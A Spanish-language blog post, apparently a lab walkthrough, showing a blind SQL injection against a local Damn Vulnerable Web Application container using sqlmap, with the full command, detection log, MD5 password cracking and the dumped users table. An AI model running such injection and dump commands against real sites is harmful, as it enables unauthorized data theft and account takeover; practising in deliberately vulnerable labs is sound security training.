---
title: DVWA 
date: 2025-04-2 17:00:00 +0200
categories: [hacking, sqli] 
tags: [dvwa, sqli, sqlmap]     # TAG names should always be lowercase

image:
    path: https://github.com/digininja/DVWA/blob/master/dvwa/images/logo.png?raw=true
    alt: DVWA
---

## DVWA 

>Damn Vulnerable Web Application (DVWA) es una aplicación web PHP/MariaDB extremadamente vulnerable. Su objetivo principal es ayudar a los profesionales de la seguridad a poner a prueba sus habilidades y herramientas en un entorno legal, ayudar a los desarrolladores web a comprender mejor los procesos de seguridad de aplicaciones web y ayudar tanto a estudiantes como a profesores a aprender sobre seguridad de aplicaciones web en un entorno de clase controlado.

Más info sobre DVWA en [Hacktools/#vulnerable-machines](../hacktools/#vulnerable-machines)
Ahora vamos a realizar un ejemplo de injección sql_blind con la herramienta **sqlmap**, para que todo sea automático he puesto el flag __--batch__
Para el ejercicio he montado el docker con el archivo docker del proyecto de DVWA. 

``` shell
pablo☠office sqlmap$ ./sqlmap.py --url "http://192.168.2.125:8090/vulnerabilities/sqli_blind?id=1&Submit=Submit"  --cookie="PHPSESSID=fl7f8c1lva3pup4adt7djg46q1;security=low" --data="id=1&Submit=Submit" -p id  --risk 3 --level 5 --dump --batch
```
La seguridad está en "low" y la cookie podemos copiarla del navegador. 
Al parecer el parámetro id supone una entrada no sanitizada y permite este tipo de inyección SQL que un adversario
puede utilizar para extraer los datos de la base de datos.
sqlmap incluye una opción que le permite identificar y crackear passwords en md5 e incluye su propio diccionario.

Aquí es cuando Sqlmap [Hacktools/#sql-injection](../hacktools/#sql-injection-1)(descubre que el parámetro id parece inyectable usando la técnica de __boolean-based blind__ 
``` shell
[21:49:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:49:58] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User ID exists in the database.")
[21:49:59] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
```

El proceso continua e incluso se consiguen las passwords de los usuarios. 
``` shell
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:51:04] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/home/pablo/pentest/web/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:51:04] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:51:04] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[21:51:04] [INFO] starting 4 processes 
[21:51:07] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                                                                           
[21:51:09] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                                                                          
[21:51:13] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                                                                          
[21:51:14] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                                                                         
Database: dvwa                                                                                                                                                                                                    
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2025-04-02 18:20:58 | 0            |
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2025-04-02 18:20:58 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2025-04-02 18:20:58 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2025-04-02 18:20:58 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2025-04-02 18:20:58 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[21:51:20] [INFO] table 'dvwa.users' dumped to CSV file '/home/pablo/.local/share/sqlmap/output/192.168.2.125/dump/dvwa/users.csv'

```

Pues ya estaría. Te has pasado el ejercicio con un solo comando. Happy hacking!!!.